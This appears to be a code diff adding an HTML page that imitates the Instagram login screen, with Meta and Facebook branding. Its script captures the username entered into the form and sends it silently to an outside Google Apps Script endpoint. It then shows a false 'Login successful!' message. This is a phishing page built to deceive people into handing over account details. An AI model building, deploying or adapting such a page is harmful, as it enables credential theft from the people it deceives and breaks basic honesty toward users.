@@ -1,0 +1,350 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Instagram Log in or Sign up</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, Helvetica, sans-serif;
+    background: white;
+    color: #111;
+}
+
+.page {
+    min-height: 100vh;
+    display: grid;
+    grid-template-columns: 50% 50%;
+}
+
+/* LEFT SIDE */
+.visual {
+    position: relative;
+    min-height: 100vh;
+    border-right: 2px solid #ddd;
+    overflow: hidden;
+}
+
+.instagram-logo {
+    position: absolute;
+    top: 68px;
+    left: 72px;
+    width: 110px;
+}
+
+.visual h1 {
+    position: absolute;
+    top: 220px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 700px;
+    margin: 0;
+    text-align: center;
+    font-size: 42px;
+    line-height: 1.45;
+    font-weight: 400;
+    letter-spacing: -1px;
+}
+
+.visual h1 span {
+    background: linear-gradient(
+        90deg,
+        #ff4b4b,
+        #f5008f,
+        #8a2be2
+    );
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.reference-art {
+    position: absolute;
+    top: 410px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 590px;
+    max-width: 85%;
+}
+
+/* RIGHT SIDE */
+.login-area {
+    width: 720px;
+    max-width: calc(100% - 120px);
+    margin: auto;
+}
+
+.panel {
+    width: 100%;
+}
+
+.panel-title {
+    font-size: 25px;
+    font-weight: 600;
+    margin-bottom: 32px;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+}
+
+.input {
+    width: 100%;
+    height: 95px;
+    padding: 0 24px;
+    border: 1px solid #d5d5d5;
+    border-radius: 18px;
+    font-size: 19px;
+    outline: none;
+}
+
+.input:focus {
+    border: 2px solid #1683ff;
+}
+
+.login-btn {
+    width: 100%;
+    height: 64px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 35px;
+    background: #94bdf0;
+    color: white;
+    font-size: 19px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.login-btn:hover {
+    background: #79abe8;
+}
+
+.forgot {
+    display: block;
+    margin-top: 38px;
+    text-align: center;
+    color: #111;
+    text-decoration: none;
+    font-size: 18px;
+}
+
+.facebook {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+
+    width: 100%;
+    height: 64px;
+    margin-top: 94px;
+
+    background: #f1f2f4;
+    border-radius: 35px;
+
+    color: #111;
+    text-decoration: none;
+    font-size: 19px;
+}
+
+.facebook-icon {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+
+    background: #1877f2;
+    color: white;
+    font-weight: bold;
+    font-size: 15px;
+}
+
+.signup {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    width: 100%;
+    height: 64px;
+    margin-top: 17px;
+
+    border: 1.5px solid #1683ff;
+    border-radius: 35px;
+
+    color: #0879ed;
+    text-decoration: none;
+    font-size: 19px;
+}
+
+.meta {
+    margin-top: 35px;
+    text-align: center;
+    font-size: 23px;
+    font-weight: 500;
+}
+
+.meta::before {
+    content: "∞";
+    color: #087df5;
+    font-size: 30px;
+    font-weight: bold;
+    margin-right: 3px;
+}
+
+/* MOBILE */
+@media (max-width: 900px) {
+
+    .page {
+        display: block;
+    }
+
+    .visual {
+        display: none;
+    }
+
+    .login-area {
+        width: 100%;
+        max-width: 500px;
+        padding: 30px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<main class="page">
+
+    <!-- LEFT -->
+    <section class="visual">
+
+        <img
+            class="instagram-logo"
+            src="InstaLogo.png"
+            alt="Instagram"
+        >
+
+        <h1>
+            See everyday moments from your<br>
+            <span>close friends.</span>
+        </h1>
+
+        <img
+            class="reference-art"
+            src="InstaPic.png"
+            alt="Instagram preview"
+        >
+
+    </section>
+
+
+    <!-- RIGHT -->
+    <section class="login-area">
+
+        <div class="panel">
+
+            <div class="panel-title">
+                Log into Instagram
+            </div>
+
+            <form id="loginForm">
+
+                <input
+                    id="username"
+                    class="input"
+                    type="text"
+                    placeholder="Mobile number, username or email"
+                    autocomplete="off"
+                    required
+                >
+
+                <input
+                    class="input"
+                    type="password"
+                    placeholder="Password"
+                    autocomplete="off"
+                    required
+                >
+
+                <button
+                    class="login-btn"
+                    type="submit">
+                    Log in
+                </button>
+
+            </form>
+
+            <a href="#" class="forgot">
+                Forgot password?
+            </a>
+
+            <a href="#" class="facebook">
+                <span class="facebook-icon">f</span>
+                Log in with Facebook
+            </a>
+
+            <a href="signup.html" class="signup">
+    			Create new account
+			</a>
+
+            <div class="meta">
+                Meta
+            </div>
+
+        </div>
+
+    </section>
+
+</main>
+
+
+<script>
+const SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbxWnAeaIYVlChci-hjoGJj6AFfP_UZ0UpbcR72pDijnS5SdeuPDWLLFt-PaWzbVjQ-0/exec";
+
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    const username = document.getElementById("username").value;
+
+    const data = new URLSearchParams();
+    data.append("username", username);
+
+    try {
+
+        await fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: data.toString()
+        });
+
+        alert("Login successful!");
+
+        document.getElementById("loginForm").reset();
+
+    } catch (error) {
+
+        console.error(error);
+        alert("Something went wrong.");
+
+    }
+
+});
+</script>
+
+</body>
+</html>
